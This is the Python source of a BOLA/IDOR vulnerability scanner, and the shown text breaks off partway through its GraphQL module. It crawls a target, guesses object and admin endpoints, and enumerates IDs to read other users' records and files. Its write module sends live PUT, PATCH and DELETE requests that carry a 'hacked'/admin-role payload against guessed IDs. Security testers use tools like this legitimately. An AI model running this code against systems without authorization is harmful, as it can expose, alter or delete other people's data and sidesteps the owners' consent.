"""
BOLA / IDOR Vulnerability Scanner v2.0 — Full 12-Module Edition
================================================================
Covers ALL major BOLA attack vectors:

  01. ID Manipulation         — user_id, order_id, post_id tampering
  02. Nested Object Testing   — payment_id, file_id inside API responses
  03. PUT/PATCH/DELETE        — modify or delete another user's object
  04. Parameter Tampering     — ?user_id=101 → 102 in query strings
  05. Mass ID Enumeration     — bulk sweep of hundreds of IDs
  06. File/Media Objects      — access other users' files by ID
  07. Secondary Endpoints     — hidden/alternate APIs for same object
  08. UUID Object Testing     — UUIDs harvested from responses
  09. GraphQL BOLA            — ID manipulation in GraphQL queries
  10. Multi-Step Workflow     — skip steps / change IDs mid-workflow
  11. Role-Based Access       — normal user accessing admin objects
  12. Mobile API Testing      — common mobile API endpoint patterns

Install:
  pip install aiohttp beautifulsoup4

Usage:
  python bola_scanner_v2.py <url>
  python bola_scanner_v2.py <url> --token <jwt>
  python bola_scanner_v2.py <url> --token <jwt> --token2 <other_user_jwt>
"""

import asyncio, aiohttp, sys, re, time, json, argparse, base64
from urllib.parse import urlparse, urljoin, urlunparse, parse_qs, urlencode
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple, Set
from bs4 import BeautifulSoup

# ══════════════════════════════════════════════════════════
#  TERMINAL COLORS
# ══════════════════════════════════════════════════════════
SEVERITY_COLOR = {
    "CRITICAL": "\033[91m", "HIGH": "\033[31m",
    "MEDIUM":   "\033[33m", "LOW":  "\033[34m", "INFO": "\033[37m",
}
RESET = "\033[0m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
GREEN = "\033[92m"
CYAN  = "\033[96m"

# ══════════════════════════════════════════════════════════
#  DATA MODELS
# ══════════════════════════════════════════════════════════

@dataclass
class BOLAFinding:
    module: str           # which of the 12 modules found it
    name: str
    severity: str
    description: str
    endpoint: str
    method: str   = "GET"
    evidence: str = ""
    original_id: str = ""
    tested_id: str   = ""
    recommendation: str = ""

@dataclass
class ScanResult:
    target: str
    duration: float = 0.0
    findings: List[BOLAFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    modules_run: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

# ══════════════════════════════════════════════════════════
#  CONSTANTS — Endpoint Lists
# ══════════════════════════════════════════════════════════

# API endpoint path patterns (used in JS source scanning)
API_PATH_PATTERNS = [
    r'/api/', r'/v\d+/', r'/rest/', r'/graphql',
    r'/user[s]?/', r'/account[s]?/', r'/order[s]?/', r'/profile[s]?/',
    r'/document[s]?/', r'/file[s]?/', r'/record[s]?/', r'/item[s]?/',
    r'/product[s]?/', r'/invoice[s]?/', r'/payment[s]?/', r'/admin/',
    r'/report[s]?/', r'/message[s]?/', r'/ticket[s]?/', r'/post[s]?/',
    r'/comment[s]?/', r'/media/', r'/upload[s]?/', r'/download/',
]

# 01. Core ID-bearing paths
CORE_ID_PATHS = [
    "/api/v1/users/{id}",     "/api/users/{id}",
    "/api/v1/profile/{id}",   "/api/profile/{id}",
    "/api/v1/orders/{id}",    "/api/orders/{id}",
    "/api/v1/payments/{id}",  "/api/payments/{id}",
    "/api/v1/invoices/{id}",  "/api/invoices/{id}",
    "/api/v1/documents/{id}", "/api/documents/{id}",
    "/api/v1/records/{id}",   "/api/records/{id}",
    "/api/v1/items/{id}",     "/api/items/{id}",
    "/api/v1/messages/{id}",  "/api/messages/{id}",
    "/api/v1/tickets/{id}",   "/api/tickets/{id}",
    "/api/v1/posts/{id}",     "/api/posts/{id}",
    "/api/v1/comments/{id}",  "/api/comments/{id}",
    "/users/{id}",            "/orders/{id}",
    "/profile/{id}",          "/account/{id}",
    "/posts/{id}",            "/tickets/{id}",
]

# 06. File/media paths
FILE_PATHS = [
    "/api/v1/files/{id}",       "/api/files/{id}",
    "/api/v1/uploads/{id}",     "/api/uploads/{id}",
    "/api/v1/media/{id}",       "/api/media/{id}",
    "/api/v1/attachments/{id}", "/api/attachments/{id}",
    "/api/v1/photos/{id}",      "/api/photos/{id}",
    "/api/v1/images/{id}",      "/api/images/{id}",
    "/api/v1/videos/{id}",      "/api/videos/{id}",
    "/api/v1/documents/{id}/download",
    "/api/v1/files/{id}/content",
    "/api/v1/files/{id}/download",
    "/files/{id}",              "/uploads/{id}",
    "/media/{id}",              "/download/{id}",
    "/download?file_id={id}",   "/api/export?doc_id={id}",
]

# 07. Secondary/hidden endpoints for same object
SECONDARY_ENDPOINT_PATTERNS = [
    ("{base}/export",        "{base}/export?format=json"),
    ("{base}/download",      "{base}/raw"),
    ("{base}/details",       "{base}/full"),
    ("{base}/preview",       "{base}/summary"),
    ("{base}/history",       "{base}/audit"),
    ("{base}/settings",      "{base}/config"),
    ("{base}/permissions",   "{base}/access"),
    ("{base}?format=json",   "{base}?view=admin"),
    ("{base}?expand=true",   "{base}?include=all"),
    ("{base}.json",          "{base}.xml"),
    ("{base}/v1{path}",      "{base}/v2{path}"),
    ("{base}/internal{path}", "{base}/private{path}"),
]

# 11. Admin / privileged paths
ADMIN_PATHS = [
    "/api/v1/admin/users",          "/api/admin/users",
    "/api/v1/admin/users/{id}",     "/api/admin/users/{id}",
    "/api/v1/admin/orders",         "/api/admin/orders",
    "/api/v1/admin/payments",       "/api/admin/payments",
    "/api/v1/admin/settings",       "/api/admin/settings",
    "/api/v1/admin/dashboard",      "/api/admin/dashboard",
    "/api/v1/admin/reports",        "/api/admin/reports",
    "/api/v1/admin/logs",           "/api/admin/logs",
    "/api/v1/admin/config",         "/api/admin/config",
    "/admin/users/{id}",            "/admin/dashboard",
    "/admin/orders/{id}",           "/admin/settings",
    "/management/users",            "/management/users/{id}",
    "/superadmin/users",            "/internal/users",
    "/api/v1/staff/users/{id}",     "/api/staff/users/{id}",
    "/api/v1/moderator/posts/{id}", "/api/v1/roles/{id}",
    "/api/v1/permissions/{id}",     "/api/v1/privileges",
]

# 12. Mobile API patterns
MOBILE_API_PATHS = [
    "/mobile/api/v1/users/{id}",    "/mobile/api/users/{id}",
    "/app/api/v1/users/{id}",       "/app/api/users/{id}",
    "/mapi/users/{id}",             "/mapi/orders/{id}",
    "/ios/api/v1/users/{id}",       "/android/api/v1/users/{id}",
    "/api/mobile/users/{id}",       "/api/mobile/orders/{id}",
    "/api/app/profile/{id}",        "/api/app/user/{id}",
    "/api/v1/mobile/profile",       "/api/v1/mobile/user",
    "/api/v2/users/{id}",           "/api/v3/users/{id}",
    "/api/v1/sync/user/{id}",       "/api/v1/push/user/{id}",
    "/api/v1/device/user/{id}",     "/api/v1/app/settings/{id}",
]

# 10. Multi-step workflow endpoints
WORKFLOW_STEPS = [
    # Checkout workflow
    ["/api/v1/cart",           "/api/v1/checkout/initiate",
     "/api/v1/checkout/confirm", "/api/v1/orders/{id}/complete"],
    # KYC/onboarding
    ["/api/v1/onboarding/step1", "/api/v1/onboarding/step2",
     "/api/v1/onboarding/step3", "/api/v1/onboarding/complete"],
    # Password reset
    ["/api/v1/auth/forgot-password", "/api/v1/auth/verify-token",
     "/api/v1/auth/reset-password"],
    # File upload
    ["/api/v1/upload/initiate",   "/api/v1/upload/{id}/chunk",
     "/api/v1/upload/{id}/complete"],
    # Payment
    ["/api/v1/payment/initiate",  "/api/v1/payment/{id}/confirm",
     "/api/v1/payment/{id}/capture"],
]

# ══════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════

UUID_RE  = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
NUM_RE   = re.compile(r'/(\d{1,10})(?:/|$|\?|#)')
PARAM_RE = re.compile(
    r'[?&](id|user_id|uid|account_id|order_id|item_id|doc_id|file_id|'
    r'profile_id|customer_id|record_id|object_id|post_id|payment_id|'
    r'message_id|ticket_id|comment_id|media_id)=([^&\s#]+)',
    re.I
)

def similarity(a: str, b: str) -> float:
    if not a or not b: return 0.0
    la, lb = len(a), len(b)
    len_sim  = 1 - abs(la - lb) / max(la, lb, 1)
    head_sim = 1.0 if a[:300] == b[:300] else 0.0
    tail_sim = 1.0 if a[-100:] == b[-100:] else 0.0
    return (len_sim + head_sim + tail_sim) / 3

def build_headers(token: Optional[str]) -> Dict[str, str]:
    h = {"User-Agent": "Mozilla/5.0 (compatible; BOLAScannerV2/2.0)",
         "Accept": "application/json, text/html, */*",
         "Content-Type": "application/json"}
    if token:
        h["Authorization"] = token if token.startswith("Bearer ") else f"Bearer {token}"
    return h

async def fetch(session: aiohttp.ClientSession, url: str,
                token: Optional[str] = None, method: str = "GET",
                data: Optional[dict] = None, headers_extra: Optional[dict] = None
               ) -> Tuple[int, str, dict]:
    try:
        hdrs = build_headers(token)
        if headers_extra:
            hdrs.update(headers_extra)
        kw: dict = dict(headers=hdrs, allow_redirects=True, ssl=False)
        if method in ("POST", "PUT", "PATCH") and data is not None:
            kw["json"] = data
        async with session.request(method, url, **kw) as r:
            body = await r.text(errors="ignore")
            return r.status, body, dict(r.headers)
    except asyncio.TimeoutError:
        return 0, "TIMEOUT", {}
    except Exception as e:
        return 0, f"ERR:{e}", {}

def make_url(base: str, path_template: str, id_val: str) -> str:
    return base.rstrip("/") + path_template.replace("{id}", id_val)

def gen_ids(original: str) -> List[str]:
    """Generate candidate IDs to test against the original."""
    if original.isdigit():
        n = int(original)
        ids = set()
        for d in [-2, -1, 1, 2, 3]:
            if n + d > 0: ids.add(str(n + d))
        for fixed in [1, 2, 3, 99, 100]: ids.add(str(fixed))
        ids.discard(original)
        return list(ids)[:8]
    if UUID_RE.fullmatch(original):
        parts = original.split("-")
        try:
            new = format(int(parts[-1], 16) + 1, '012x')
            return ["-".join(parts[:-1] + [new]),
                    "00000000-0000-0000-0000-000000000001",
                    "00000000-0000-0000-0000-000000000002"]
        except: pass
    return ["1", "2", "3"]

def replace_id_in_url(url: str, old_id: str, new_id: str) -> str:
    # Replace in path
    new = re.sub(r'(/)' + re.escape(old_id) + r'(/|$|\?|#)',
                 r'\g<1>' + new_id + r'\g<2>', url, count=1)
    # Replace in query
    new = re.sub(r'(=)' + re.escape(old_id) + r'(&|$)',
                 r'\g<1>' + new_id + r'\g<2>', new, count=1)
    return new

def extract_uuids_from_body(body: str) -> List[str]:
    return list(set(UUID_RE.findall(body)))

def extract_ids_from_body(body: str) -> Dict[str, List[str]]:
    """Extract nested object IDs from JSON API responses."""
    found: Dict[str, List[str]] = {}
    id_fields = [
        "payment_id", "file_id", "attachment_id", "media_id",
        "document_id", "invoice_id", "subscription_id", "order_id",
        "user_id", "account_id", "profile_id", "message_id",
        "ticket_id", "comment_id", "post_id", "report_id",
    ]
    for field_name in id_fields:
        pattern = rf'["\']?{re.escape(field_name)}["\']?\s*[=:]\s*["\']?(\d{{1,10}}|[0-9a-f\-]{{36}})["\']?'
        matches = re.findall(pattern, body, re.I)
        if matches:
            found[field_name] = list(set(matches))
    return found

# ══════════════════════════════════════════════════════════
#  ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════════════

async def discover_endpoints(session, base_url, token) -> List[str]:
    found: Set[str] = set()
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Main page crawl
    status, body, _ = await fetch(session, base_url, token)
    if status == 200 and body:
        soup = BeautifulSoup(body, "html.parser")
        for tag in soup.find_all(["a", "form"], href=True):
            href = tag.get("href", "")
            if href:
                full = urljoin(base_url, href)
                if urlparse(full).netloc == parsed.netloc:
                    found.add(full)
        for s in soup.find_all("script"):
            js = s.string or ""
            for m in re.finditer(r'["`\'](\/[a-zA-Z0-9_/\-?=&.]{3,80})["`\']', js):
                path = m.group(1)
                if any(re.search(p, path) for p in API_PATH_PATTERNS):
                    found.add(urljoin(base_url, path))

        # External JS files
        js_srcs = [urljoin(base_url, s["src"]) for s in soup.find_all("script", src=True)
                   if urlparse(urljoin(base_url, s["src"])).netloc == parsed.netloc]
        async def scan_js(js_url):
            _, jb, _ = await fetch(session, js_url, token)
            if jb:
                for m in re.finditer(r'["`\'](\/[a-zA-Z0-9_/\-?=&.]{3,80})["`\']', jb):
                    p = m.group(1)
                    if any(re.search(pat, p) for pat in API_PATH_PATTERNS):
                        found.add(urljoin(base_url, p))
        await asyncio.gather(*[scan_js(u) for u in js_srcs[:10]])

    # robots.txt + sitemap
    for meta_url in [f"{origin}/robots.txt", f"{origin}/sitemap.xml"]:
        _, mb, _ = await fetch(session, meta_url, token)
        if mb and "ERR" not in mb and "TIMEOUT" not in mb:
            for m in re.finditer(r'(Disallow:|<loc>)\s*(.+)', mb):
                path = m.group(2).strip().replace("</loc>", "")
                if path.startswith("/") or path.startswith("http"):
                    full = urljoin(base_url, path)
                    if urlparse(full).netloc == parsed.netloc:
                        found.add(full)

    # Add all template paths with ID=1
    for path in CORE_ID_PATHS + FILE_PATHS + ADMIN_PATHS + MOBILE_API_PATHS:
        found.add(make_url(origin, path, "1"))

    return list(found)

# ══════════════════════════════════════════════════════════
#  MODULE 01 — ID Manipulation (core GET)
# ══════════════════════════════════════════════════════════

async def module_01_id_manipulation(session, base_url, token, token2,
                                    endpoints, findings):
    """Test GET endpoints: change user_id, order_id, post_id etc."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    for url in endpoints:
        # Find numeric IDs in path
        num_matches = NUM_RE.findall(url)
        # Find ID params in query
        param_matches = PARAM_RE.findall(url)

        all_ids = [(m, "path") for m in num_matches] + \
                  [(v, f"param:{k}") for k,v in param_matches]

        for orig_id, loc in all_ids:
            base_s, base_b, _ = await fetch(session, url, token)
            if base_s not in (200, 201) or len(base_b) < 20:
                continue

            for test_id in gen_ids(orig_id)[:4]:
                test_url = replace_id_in_url(url, orig_id, test_id)
                if test_url == url: continue

                ts, tb, _ = await fetch(session, test_url, token)
                if ts == 200 and len(tb) > 20:
                    sim = similarity(base_b, tb)
                    if 0.05 < sim < 0.92:
                        findings.append(BOLAFinding(
                            module="01-ID-Manipulation",
                            name="BOLA: ID Manipulation — Different Object Returned",
                            severity="CRITICAL",
                            description=(
                                f"Changing ID '{orig_id}' → '{test_id}' in {loc} "
                                f"returned a different object (HTTP {ts}). "
                                f"Another user's data may be exposed."
                            ),
                            endpoint=url, method="GET",
                            evidence=(
                                f"Original: {url} → HTTP {base_s} ({len(base_b)}B) | "
                                f"Tampered: {test_url} → HTTP {ts} ({len(tb)}B) | "
                                f"Similarity: {sim:.0%}"
                            ),
                            original_id=orig_id, tested_id=test_id,
                            recommendation="Validate object ownership server-side on every request. Never rely on the ID alone.",
                        ))
                        break

# ══════════════════════════════════════════════════════════
#  MODULE 02 — Nested Object Testing
# ══════════════════════════════════════════════════════════

async def module_02_nested_objects(session, base_url, token, token2,
                                   endpoints, findings):
    """Extract nested IDs (payment_id, file_id etc.) from responses and test them."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    nested_endpoint_map = {
        "payment_id":      ["/api/v1/payments/{id}", "/api/payments/{id}"],
        "file_id":         ["/api/v1/files/{id}",    "/api/files/{id}"],
        "attachment_id":   ["/api/v1/attachments/{id}"],
        "invoice_id":      ["/api/v1/invoices/{id}", "/api/invoices/{id}"],
        "subscription_id": ["/api/v1/subscriptions/{id}"],
        "document_id":     ["/api/v1/documents/{id}", "/api/documents/{id}"],
        "message_id":      ["/api/v1/messages/{id}", "/api/messages/{id}"],
        "comment_id":      ["/api/v1/comments/{id}", "/api/comments/{id}"],
        "media_id":        ["/api/v1/media/{id}",    "/api/media/{id}"],
        "report_id":       ["/api/v1/reports/{id}",  "/api/reports/{id}"],
    }

    for url in endpoints[:20]:
        _, body, _ = await fetch(session, url, token)
        if not body or len(body) < 30: continue

        nested = extract_ids_from_body(body)
        for field_name, id_list in nested.items():
            if field_name not in nested_endpoint_map: continue
            for nested_id in id_list[:2]:
                for path_tpl in nested_endpoint_map[field_name]:
                    test_url = make_url(origin, path_tpl, nested_id)
                    ts, tb, _ = await fetch(session, test_url, token)
                    if ts == 200 and len(tb) > 20:
                        # Now test with adjacent ID
                        for alt_id in gen_ids(nested_id)[:2]:
                            alt_url = make_url(origin, path_tpl, alt_id)
                            as_, ab, _ = await fetch(session, alt_url, token)
                            if as_ == 200 and len(ab) > 20 and similarity(tb, ab) < 0.9:
                                findings.append(BOLAFinding(
                                    module="02-Nested-Objects",
                                    name=f"BOLA: Nested Object Exposed ({field_name})",
                                    severity="HIGH",
                                    description=(
                                        f"Nested '{field_name}' found in response of {url}. "
                                        f"Changing the ID to '{alt_id}' returned a different object."
                                    ),
                                    endpoint=test_url, method="GET",
                                    evidence=(
                                        f"Discovered {field_name}='{nested_id}' in response of {url} | "
                                        f"Alt ID '{alt_id}': HTTP {as_} ({len(ab)}B)"
                                    ),
                                    original_id=nested_id, tested_id=alt_id,
                                    recommendation="Validate ownership for all nested object IDs in responses.",
                                ))
                                break

# ══════════════════════════════════════════════════════════
#  MODULE 03 — PUT / PATCH / DELETE Testing
# ══════════════════════════════════════════════════════════

async def module_03_write_methods(session, base_url, token, token2,
                                   endpoints, findings):
    """Try modifying or deleting another user's object via PUT/PATCH/DELETE."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    write_paths = [
        ("/api/v1/users/{id}",     ["PUT", "PATCH", "DELETE"]),
        ("/api/users/{id}",        ["PUT", "PATCH", "DELETE"]),
        ("/api/v1/posts/{id}",     ["PUT", "PATCH", "DELETE"]),
        ("/api/posts/{id}",        ["PUT", "PATCH", "DELETE"]),
        ("/api/v1/orders/{id}",    ["PATCH", "DELETE"]),
        ("/api/orders/{id}",       ["PATCH", "DELETE"]),
        ("/api/v1/comments/{id}",  ["PUT", "PATCH", "DELETE"]),
        ("/api/comments/{id}",     ["PUT", "PATCH", "DELETE"]),
        ("/api/v1/profile/{id}",   ["PUT", "PATCH"]),
        ("/api/profile/{id}",      ["PUT", "PATCH"]),
        ("/api/v1/messages/{id}",  ["DELETE"]),
        ("/api/v1/tickets/{id}",   ["PUT", "PATCH"]),
        ("/api/v1/documents/{id}", ["PUT", "DELETE"]),
        ("/api/v1/files/{id}",     ["DELETE"]),
        ("/api/v1/payments/{id}",  ["PATCH", "DELETE"]),
        ("/api/v1/invoices/{id}",  ["PATCH"]),
    ]

    tamper_payload = {
        "email": "hacked@evil.com",
        "name":  "hacked",
        "role":  "admin",
        "status": "cancelled",
        "title":  "HACKED",
        "body":   "HACKED CONTENT",
    }

    async def probe(path_tpl, method, test_id):
        url = make_url(origin, path_tpl, test_id)
        s, b, hdrs = await fetch(session, url, token, method=method,
                                  data=tamper_payload if method != "DELETE" else None)
        if s in (200, 201, 202, 204):
            severity = "CRITICAL" if method == "DELETE" else "CRITICAL"
            findings.append(BOLAFinding(
                module="03-PUT-PATCH-DELETE",
                name=f"BOLA: Unauthorized {method} on Another User's Object",
                severity=severity,
                description=(
                    f"{method} request on '{path_tpl.format(id=test_id)}' returned HTTP {s}. "
                    f"An attacker may be able to modify or delete another user's data."
                ),
                endpoint=url, method=method,
                evidence=(
                    f"{method} {url} → HTTP {s} | "
                    f"Payload: {json.dumps(tamper_payload)[:80]} | "
                    f"Response: {b[:100]}"
                ),
                original_id="(current user's)", tested_id=test_id,
                recommendation=(
                    f"On every {method} request, verify the requesting user owns the object. "
                    f"Return HTTP 403 if they do not."
                ),
            ))

    tasks = []
    for path_tpl, methods in write_paths:
        for method in methods:
            for test_id in ["1", "2", "3", "100"]:
                tasks.append(probe(path_tpl, method, test_id))
    await asyncio.gather(*tasks, return_exceptions=True)

# ══════════════════════════════════════════════════════════
#  MODULE 04 — Parameter Tampering
# ══════════════════════════════════════════════════════════

async def module_04_parameter_tampering(session, base_url, token, token2,
                                         endpoints, findings):
    """Tamper with user_id, account_id, owner_id query/body parameters."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    param_endpoints = [
        f"{origin}/api/v1/users?user_id=101",
        f"{origin}/api/users?user_id=101",
        f"{origin}/api/v1/orders?account_id=101",
        f"{origin}/api/orders?account_id=101",
        f"{origin}/api/v1/profile?uid=101",
        f"{origin}/api/v1/documents?owner_id=101",
        f"{origin}/api/v1/files?user_id=101",
        f"{origin}/api/v1/messages?recipient_id=101",
        f"{origin}/api/search?user_id=101",
        f"{origin}/api/v1/reports?account_id=101",
    ] + [u for u in endpoints if PARAM_RE.search(u)]

    for url in param_endpoints[:30]:
        param_match = PARAM_RE.search(url)
        if not param_match: continue
        param_name, orig_val = param_match.group(1), param_match.group(2)

        base_s, base_b, _ = await fetch(session, url, token)
        if base_s not in (200, 201) or len(base_b) < 10: continue

        for new_val in gen_ids(orig_val)[:3]:
            tampered_url = re.sub(
                rf'({re.escape(param_name)}=){re.escape(orig_val)}',
                rf'\g<1>{new_val}', url, count=1
            )
            ts, tb, _ = await fetch(session, tampered_url, token)
            if ts == 200 and len(tb) > 10 and similarity(base_b, tb) < 0.88:
                findings.append(BOLAFinding(
                    module="04-Parameter-Tampering",
                    name=f"BOLA: Parameter Tampering via '{param_name}'",
                    severity="CRITICAL",
                    description=(
                        f"Changing query parameter '{param_name}' from "
                        f"'{orig_val}' → '{new_val}' returned a different object (HTTP {ts})."
                    ),
                    endpoint=url, method="GET",
                    evidence=(
                        f"Original: ...{param_name}={orig_val} → HTTP {base_s} ({len(base_b)}B) | "
                        f"Tampered: ...{param_name}={new_val} → HTTP {ts} ({len(tb)}B)"
                    ),
                    original_id=orig_val, tested_id=new_val,
                    recommendation=(
                        f"Never use client-supplied '{param_name}' to determine which "
                        f"object to return. Derive the user from the auth token server-side."
                    ),
                ))
                break

# ══════════════════════════════════════════════════════════
#  MODULE 05 — Mass ID Enumeration
# ══════════════════════════════════════════════════════════

async def module_05_mass_enumeration(session, base_url, token, token2,
                                      endpoints, findings):
    """Sweep a large range of IDs on the most promising endpoint."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    # Pick the most promising path to enumerate
    candidate_paths = [
        "/api/v1/users/{id}", "/api/users/{id}",
        "/api/v1/orders/{id}", "/api/orders/{id}",
        "/api/v1/profile/{id}", "/api/profile/{id}",
    ]

    for path_tpl in candidate_paths:
        probe_url = make_url(origin, path_tpl, "1")
        s, b, _ = await fetch(session, probe_url, token)
        if s != 200 or len(b) < 10:
            continue  # endpoint doesn't exist

        # Endpoint exists — enumerate IDs 1–50 concurrently
        accessible = []
        async def check_id(n):
            u = make_url(origin, path_tpl, str(n))
            st, bd, _ = await fetch(session, u, token)
            if st == 200 and len(bd) > 10:
                accessible.append(str(n))

        await asyncio.gather(*[check_id(i) for i in range(1, 51)])

        if len(accessible) >= 3:
            findings.append(BOLAFinding(
                module="05-Mass-Enumeration",
                name="BOLA: Mass ID Enumeration — Multiple Objects Accessible",
                severity="CRITICAL",
                description=(
                    f"Endpoint '{path_tpl}' returned HTTP 200 for {len(accessible)} different IDs "
                    f"out of 50 tested. An attacker can enumerate all objects."
                ),
                endpoint=make_url(origin, path_tpl, "{1..50}"),
                method="GET",
                evidence=(
                    f"Accessible IDs (first 10): {', '.join(accessible[:10])} | "
                    f"Total accessible: {len(accessible)}/50"
                ),
                original_id="1", tested_id=f"1–{accessible[-1] if accessible else '50'}",
                recommendation=(
                    "Use unpredictable UUIDs instead of sequential integers. "
                    "Enforce ownership: return 403 for objects the user doesn't own."
                ),
            ))
        break  # Only enumerate one endpoint to avoid hammering

# ══════════════════════════════════════════════════════════
#  MODULE 06 — File / Media Object Testing
# ══════════════════════════════════════════════════════════

async def module_06_file_media(session, base_url, token, token2,
                                endpoints, findings):
    """Test file/media endpoints for BOLA by changing file IDs."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    async def probe_file(path_tpl, test_id):
        url = make_url(origin, path_tpl, test_id)
        s, b, hdrs = await fetch(session, url, token)
        if s == 200 and len(b) > 20:
            content_type = hdrs.get("Content-Type", "")
            alt_id = str(int(test_id) + 1) if test_id.isdigit() else "2"
            alt_url = make_url(origin, path_tpl, alt_id)
            as_, ab, _ = await fetch(session, alt_url, token)
            if as_ == 200 and len(ab) > 20 and similarity(b, ab) < 0.9:
                is_file = any(t in content_type for t in
                              ["image", "video", "audio", "pdf", "octet", "zip"])
                findings.append(BOLAFinding(
                    module="06-File-Media",
                    name="BOLA: File/Media Object Access by ID",
                    severity="HIGH",
                    description=(
                        f"File endpoint '{path_tpl}' returned different content for "
                        f"IDs '{test_id}' and '{alt_id}'. "
                        f"{'Binary file served.' if is_file else 'Metadata returned.'}"
                    ),
                    endpoint=url, method="GET",
                    evidence=(
                        f"ID '{test_id}': HTTP {s} ({len(b)}B, {content_type[:40]}) | "
                        f"ID '{alt_id}': HTTP {as_} ({len(ab)}B)"
                    ),
                    original_id=test_id, tested_id=alt_id,
                    recommendation=(
                        "Verify file ownership before serving. "
                        "Use signed short-lived URLs (pre-signed S3 URLs etc.) "
                        "instead of direct ID-based access."
                    ),
                ))
                return True
        return False

    tasks = []
    for path_tpl in FILE_PATHS:
        for tid in ["1", "2", "100"]:
            tasks.append(probe_file(path_tpl, tid))
    await asyncio.gather(*tasks, return_exceptions=True)

# ══════════════════════════════════════════════════════════
#  MODULE 07 — Secondary Endpoint Testing
# ══════════════════════════════════════════════════════════

async def module_07_secondary_endpoints(session, base_url, token, token2,
                                         endpoints, findings):
    """Test hidden/alternate API paths for the same object."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    # For each discovered endpoint with an ID, try alternate suffixes
    suffixes = [
        "/export", "/download", "/raw", "/details", "/full",
        "/history", "/audit", "/preview", "/summary", "/config",
        "/settings", "/permissions", ".json", ".xml", ".csv",
        "?format=json", "?view=admin", "?expand=true", "?include=all",
    ]

    checked: Set[str] = set()
    for url in endpoints[:20]:
        if not NUM_RE.search(url) and not UUID_RE.search(url):
            continue
        for suffix in suffixes:
            alt = url.rstrip("/") + suffix
            if alt in checked: continue
            checked.add(alt)
            s, b, _ = await fetch(session, alt, token)
            if s == 200 and len(b) > 30:
                # Check if changing the ID on this alt endpoint also works
                num_m = NUM_RE.search(url)
                if num_m:
                    orig_id = num_m.group(1)
                    for new_id in gen_ids(orig_id)[:2]:
                        alt2 = replace_id_in_url(alt, orig_id, new_id)
                        s2, b2, _ = await fetch(session, alt2, token)
                        if s2 == 200 and len(b2) > 30 and similarity(b, b2) < 0.9:
                            findings.append(BOLAFinding(
                                module="07-Secondary-Endpoints",
                                name=f"BOLA: Secondary Endpoint Vulnerable ('{suffix}')",
                                severity="HIGH",
                                description=(
                                    f"Alternate endpoint '{suffix}' on object URL is accessible "
                                    f"and exposes different objects when the ID is changed."
                                ),
                                endpoint=alt, method="GET",
                                evidence=(
                                    f"Alt URL: {alt} → HTTP {s} ({len(b)}B) | "
                                    f"ID tampered: {alt2} → HTTP {s2} ({len(b2)}B)"
                                ),
                                original_id=orig_id, tested_id=new_id,
                                recommendation="Apply the same ownership checks to ALL endpoints for an object, including export/download variants.",
                            ))
                            break

# ══════════════════════════════════════════════════════════
#  MODULE 08 — UUID Object Testing
# ══════════════════════════════════════════════════════════

async def module_08_uuid_testing(session, base_url, token, token2,
                                  endpoints, findings):
    """Harvest UUIDs from responses and test if they can access other users' objects."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))

    harvested_uuids: Set[str] = set()
    uuid_sources: Dict[str, str] = {}

    # Harvest UUIDs from all reachable endpoints
    for url in endpoints[:15]:
        _, body, _ = await fetch(session, url, token)
        for uuid in extract_uuids_from_body(body):
            harvested_uuids.add(uuid)
            uuid_sources[uuid] = url

    if not harvested_uuids:
        return

    uuid_paths = [
        "/api/v1/users/{id}", "/api/users/{id}",
        "/api/v1/profile/{id}", "/api/profile/{id}",
        "/api/v1/documents/{id}", "/api/v1/orders/{id}",
        "/api/v1/files/{id}", "/api/v1/messages/{id}",
    ]

    for uuid in list(harvested_uuids)[:6]:
        for path_tpl in uuid_paths:
            url = make_url(origin, path_tpl, uuid)
            s, b, _ = await fetch(session, url, token)
            if s == 200 and len(b) > 20:
                # Now try an incremented UUID
                parts = uuid.split("-")
                try:
                    new_last = format(int(parts[-1], 16) + 1, '012x')
                    alt_uuid = "-".join(parts[:-1] + [new_last])
                    alt_url  = make_url(origin, path_tpl, alt_uuid)
                    as_, ab, _ = await fetch(session, alt_url, token)
                    if as_ == 200 and len(ab) > 20 and similarity(b, ab) < 0.9:
                        findings.append(BOLAFinding(
                            module="08-UUID-Testing",
                            name="BOLA: UUID Object Accessible and Enumerable",
                            severity="HIGH",
                            description=(
                                f"UUID '{uuid[:16]}...' harvested from '{uuid_sources.get(uuid, '?')}' "
                                f"successfully accessed another object when incremented."
                            ),
                            endpoint=url, method="GET",
                            evidence=(
                                f"Harvested UUID: {uuid} → HTTP {s} ({len(b)}B) | "
                                f"Incremented UUID: {alt_uuid} → HTTP {as_} ({len(ab)}B)"
                            ),
                            original_id=uuid, tested_id=alt_uuid,
                            recommendation=(
                                "UUIDs alone are not authorization. "
                                "Always verify the requesting user owns the resource. "
                                "Use v4 random UUIDs and enforce ownership checks."
                            ),
                        ))
                        break
                except Exception:
                    pass

# ══════════════════════════════════════════════════════════
#  MODULE 09 — GraphQL Object Testing
# ══════════════════════════════════════════════════════════

async def module_09_graphql(session, base_url, token, token2,
                             endpoints, findings):
    """Modify object IDs in GraphQL queries to test for BOLA."""
    origin = "{0.scheme}://{0.netloc}".format(urlparse(base_url))
    gql_paths = ["/graphql", "/api/graphql", "/api/v1/graphql", "/gql", "/query"]

    for gql_path in gql_paths:
        gql_url = f"{origin}{gql_path}"
        intro   = {"query": "{ __schema { queryType { fields { name } } } }"}
        s, b, _ = await fetch(session, gql_url, token, "POST", intro)
        if s != 200 or "queryType" not in b:
            continue

        # GraphQL found — test object queries
        object_queries = [
            ("user",         '{ user(id: ID) { id email name role createdAt } }'),
            ("order",        '{ order(id: ID) { id total status items { id } } }'),
